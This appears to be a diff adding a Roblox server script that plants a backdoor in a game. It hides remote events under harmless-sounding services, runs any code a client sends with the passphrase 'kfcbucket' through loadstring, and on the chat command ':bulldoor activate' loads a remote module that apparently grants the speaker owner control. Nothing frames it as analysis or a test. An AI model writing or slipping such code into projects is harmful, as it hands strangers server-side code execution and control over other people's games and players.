@@ -1,0 +1,43 @@
+local remote1, remote2 = nil, nil
+
+local function creation()
+	remote1 = Instance.new("RemoteEvent", game:GetService("VoiceChatService"))
+	remote1.Name = "VoiceRequest"
+	remote2 = Instance.new("RemoteEvent", game:GetService("JointsService"))
+	remote2.Name = "Welds"
+	remote1.OnServerEvent:Connect(function(plr, arg, c)
+		if arg == "kfcbucket" then
+			if c then
+				loadstring(c)()
+			end
+			if not c then
+				local kui = script.Localscript:Clone()
+				kui.Parent = plr.PlayerGui
+				kui.Enabled = true
+			end
+		end
+	end)
+	remote2.OnServerEvent:Connect(function(plr, arg, c)
+		if arg == "kfcbucket" then
+			if c then
+				loadstring(c)()
+			end
+			if not c then
+				local kui = script.Localscript:Clone()
+				kui.Parent = plr.PlayerGui
+				kui.Enabled = true
+			end
+		end
+	end)
+end
+
+creation()
+
+
+game:GetService("Players").PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(message)
+		if message == ":bulldoor activate" then
+			require(14752326339).Owner(player.Name)
+		end
+	end)
+end)
